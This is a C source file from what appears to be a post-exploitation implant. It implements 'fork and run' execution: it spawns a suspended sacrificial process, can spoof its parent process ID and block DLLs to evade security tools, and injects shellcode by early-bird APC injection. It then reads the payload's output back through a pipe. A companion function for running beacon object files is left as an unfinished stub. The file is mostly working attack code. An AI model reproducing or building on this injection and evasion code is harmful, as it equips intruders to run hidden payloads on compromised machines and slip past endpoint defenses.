/*
 * fork_run.c — Fork & Run implementation.
 *
 * Spawns a sacrificial process, injects payload, captures output via
 * anonymous pipe, waits for completion, cleans up.
 */
#include "agent.h"
#include "fork_run.h"
#include "inject.h"
#include "evasion.h"

#ifndef FORK_RUN_OUTPUT_MAX
#define FORK_RUN_OUTPUT_MAX (4 * 1024 * 1024)  /* 4MB max output */
#endif

#ifndef FORK_RUN_DEFAULT_TIMEOUT
#define FORK_RUN_DEFAULT_TIMEOUT 60000  /* 60 seconds */
#endif

static void _fr_error(FORK_RUN_RESULT *r, const char *msg) {
    if (!r) return;
    r->success = FALSE;
    strncpy(r->errorMsg, msg, sizeof(r->errorMsg) - 1);
    r->errorMsg[sizeof(r->errorMsg) - 1] = '\0';
}

/*
 * Read all available data from the pipe (non-blocking reads with timeout).
 */
static BOOL _read_pipe_output(HANDLE hPipe, BYTE **outBuf, DWORD *outLen,
                               DWORD timeoutMs) {
    DWORD totalRead = 0;
    DWORD bufSize = 4096;
    BYTE *buf = (BYTE *)HeapAlloc(GetProcessHeap(), 0, bufSize);
    if (!buf) return FALSE;

    DWORD startTick = GetTickCount();
    BYTE tmpBuf[4096];

    while (totalRead < FORK_RUN_OUTPUT_MAX) {
        DWORD elapsed = GetTickCount() - startTick;
        if (elapsed >= timeoutMs) break;

        DWORD available = 0;
        if (!PeekNamedPipe(hPipe, NULL, 0, NULL, &available, NULL))
            break;

        if (available == 0) {
            Sleep(10);
            continue;
        }

        DWORD toRead = available;
        if (toRead > sizeof(tmpBuf)) toRead = sizeof(tmpBuf);

        DWORD bytesRead = 0;
        if (!ReadFile(hPipe, tmpBuf, toRead, &bytesRead, NULL) || bytesRead == 0)
            break;

        /* Grow buffer if needed */
        if (totalRead + bytesRead > bufSize) {
            DWORD newSize = bufSize * 2;
            if (newSize < totalRead + bytesRead)
                newSize = totalRead + bytesRead + 4096;
            BYTE *newBuf = (BYTE *)HeapReAlloc(GetProcessHeap(), 0, buf, newSize);
            if (!newBuf) {
                HeapFree(GetProcessHeap(), 0, buf);
                return FALSE;
            }
            buf = newBuf;
            bufSize = newSize;
        }

        memcpy(buf + totalRead, tmpBuf, bytesRead);
        totalRead += bytesRead;
    }

    *outBuf = buf;
    *outLen = totalRead;
    return TRUE;
}

BOOL fork_run_execute(const unsigned char *payload, SIZE_T payloadLen,
                       FORK_RUN_OPTS *opts, FORK_RUN_RESULT *result) {
    if (!payload || payloadLen == 0 || !result) {
        if (result) _fr_error(result, "Invalid arguments");
        return FALSE;
    }

    memset(result, 0, sizeof(*result));

    const wchar_t *spawnTo = (opts && opts->spawnTo) ? opts->spawnTo : FORK_RUN_DEFAULT_SPAWN;
    DWORD timeout = (opts && opts->timeoutMs) ? opts->timeoutMs : FORK_RUN_DEFAULT_TIMEOUT;

    /* Create anonymous pipe for output capture */
    HANDLE hPipeRead = NULL, hPipeWrite = NULL;
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&hPipeRead, &hPipeWrite, &sa, 0)) {
        _fr_error(result, "CreatePipe failed");
        return FALSE;
    }

    /* Don't inherit the read end */
    SetHandleInformation(hPipeRead, HANDLE_FLAG_INHERIT, 0);

    /* Create suspended process with output redirected to pipe */
    PROCESS_INFORMATION pi;
    memset(&pi, 0, sizeof(pi));
    BOOL created = FALSE;

    /*
     * We need to create the process with stdout/stderr redirected.
     * However, PPID spoofing uses EXTENDED_STARTUPINFO_PRESENT which
     * requires STARTUPINFOEX. We handle both paths.
     */
    if (opts && opts->ppidSpoof) {
        /* Use our existing PPID spoof function, then redirect handles manually.
         * Note: full handle redirection with PPID spoof requires passing
         * STARTUPINFOEX with both attributes. For simplicity, we create
         * with PPID spoof and then inject; output capture relies on the
         * payload writing to the pipe handle (passed as argument). */
        created = evasion_create_process_ppid_spoof(
            spawnTo, opts->ppidSpoof, opts->blockDlls ? TRUE : FALSE, &pi);
    } else if (opts && opts->blockDlls) {
        created = evasion_create_process_blockdlls(spawnTo, &pi);
    } else {
        STARTUPINFOW si;
        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdOutput = hPipeWrite;
        si.hStdError = hPipeWrite;
        si.hStdInput = NULL;

        wchar_t cmdBuf[MAX_PATH];
        wcsncpy(cmdBuf, spawnTo, MAX_PATH - 1);
        cmdBuf[MAX_PATH - 1] = L'\0';

        created = CreateProcessW(NULL, cmdBuf, NULL, NULL, TRUE,
                                  CREATE_SUSPENDED | CREATE_NO_WINDOW,
                                  NULL, NULL, &si, &pi);
    }

    if (!created) {
        _fr_error(result, "Failed to create sacrificial process");
        CloseHandle(hPipeRead);
        CloseHandle(hPipeWrite);
        return FALSE;
    }

    /* Close write end in parent — child has it */
    CloseHandle(hPipeWrite);
    hPipeWrite = NULL;

    /* Inject payload into child */
    INJECT_OPTS injectOpts;
    memset(&injectOpts, 0, sizeof(injectOpts));
    injectOpts.technique = (opts && opts->technique) ? opts->technique : INJECT_EARLY_BIRD;
    injectOpts.hProcess = pi.hProcess;
    injectOpts.hThread = pi.hThread;
    injectOpts.waitForCompletion = FALSE;

    INJECT_RESULT injectResult;
    memset(&injectResult, 0, sizeof(injectResult));

    BOOL injected = FALSE;

    if (injectOpts.technique == INJECT_EARLY_BIRD) {
        /* For early bird, the process is already suspended. Queue APC + resume. */
        void *remoteBase = NULL;
        SIZE_T regionSize = payloadLen;

        /* Allocate in child */
        remoteBase = VirtualAllocEx(pi.hProcess, NULL, payloadLen,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!remoteBase) {
            _fr_error(result, "VirtualAllocEx in child failed");
            TerminateProcess(pi.hProcess, 1);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            CloseHandle(hPipeRead);
            return FALSE;
        }

        SIZE_T written = 0;
        if (!WriteProcessMemory(pi.hProcess, remoteBase, payload, payloadLen, &written)) {
            _fr_error(result, "WriteProcessMemory in child failed");
            TerminateProcess(pi.hProcess, 1);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            CloseHandle(hPipeRead);
            return FALSE;
        }

        DWORD oldProt;
        VirtualProtectEx(pi.hProcess, remoteBase, payloadLen,
                         PAGE_EXECUTE_READ, &oldProt);

        if (QueueUserAPC((PAPCFUNC)remoteBase, pi.hThread, 0) == 0) {
            _fr_error(result, "QueueUserAPC failed");
            TerminateProcess(pi.hProcess, 1);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            CloseHandle(hPipeRead);
            return FALSE;
        }

        ResumeThread(pi.hThread);
        injected = TRUE;
    } else {
        /* Other techniques: resume first, then inject */
        ResumeThread(pi.hThread);
        Sleep(500); /* Let the process initialize */
        injectOpts.targetPid = pi.dwProcessId;
        injectOpts.hProcess = pi.hProcess;
        injected = inject_shellcode(payload, payloadLen, &injectOpts, &injectResult);
    }

    if (!injected) {
        _fr_error(result, "Injection into child failed");
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        CloseHandle(hPipeRead);
        return FALSE;
    }

    /* Read output from pipe while waiting for child to finish */
    BYTE *output = NULL;
    DWORD outputLen = 0;
    _read_pipe_output(hPipeRead, &output, &outputLen, timeout);

    /* Wait for child process to exit */
    DWORD waitResult = WaitForSingleObject(pi.hProcess, timeout);
    if (waitResult == WAIT_TIMEOUT) {
        TerminateProcess(pi.hProcess, 1);
    }

    /* Get exit code */
    DWORD exitCode = 0;
    GetExitCodeProcess(pi.hProcess, &exitCode);

    /* Cleanup */
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(hPipeRead);

    result->success = TRUE;
    result->output = output;
    result->outputLen = outputLen;
    result->exitCode = exitCode;

    return TRUE;
}

BOOL fork_run_bof(const unsigned char *coffBytes, SIZE_T coffLen,
                   const unsigned char *argBuffer, SIZE_T argLen,
                   FORK_RUN_OPTS *opts, FORK_RUN_RESULT *result) {
    /*
     * BOF-in-fork-and-run requires a shellcode wrapper that:
     *   1. Contains the COFF loader logic as position-independent code
     *   2. Embeds the BOF bytes and arguments
     *   3. Executes the BOF entry point
     *   4. Writes output to stdout (captured by pipe)
     *
     * For now, this is a placeholder that concatenates BOF + args
     * into a single buffer. A proper BOF-to-shellcode converter is
     * needed for production use (similar to COFFLoader2Shellcode).
     *
     * TODO: Implement BOF-to-shellcode conversion.
     */
    if (!result) return FALSE;
    memset(result, 0, sizeof(*result));

    /* Build combined payload: [coffLen(4)] [coffBytes] [argLen(4)] [argBuffer] */
    SIZE_T totalLen = 4 + coffLen + 4 + argLen;
    unsigned char *combined = (unsigned char *)HeapAlloc(GetProcessHeap(), 0, totalLen);
    if (!combined) {
        _fr_error(result, "HeapAlloc for combined BOF payload failed");
        return FALSE;
    }

    SIZE_T off = 0;
    *(DWORD *)(combined + off) = (DWORD)coffLen; off += 4;
    memcpy(combined + off, coffBytes, coffLen); off += coffLen;
    *(DWORD *)(combined + off) = (DWORD)argLen; off += 4;
    if (argLen > 0 && argBuffer)
        memcpy(combined + off, argBuffer, argLen);

    /*
     * NOTE: This won't actually execute as shellcode without the
     * BOF-to-shellcode wrapper. For now, fork_run_execute will inject
     * this into a child process. The child needs the COFF loader
     * embedded. This is a known limitation — flagged as TODO.
     */
    _fr_error(result, "BOF fork-and-run requires shellcode converter (not yet implemented)");
    HeapFree(GetProcessHeap(), 0, combined);
    return FALSE;
}

void fork_run_free(FORK_RUN_RESULT *result) {
    if (!result) return;
    if (result->output) {
        SecureZeroMemory(result->output, result->outputLen);
        HeapFree(GetProcessHeap(), 0, result->output);
        result->output = NULL;
        result->outputLen = 0;
    }
}
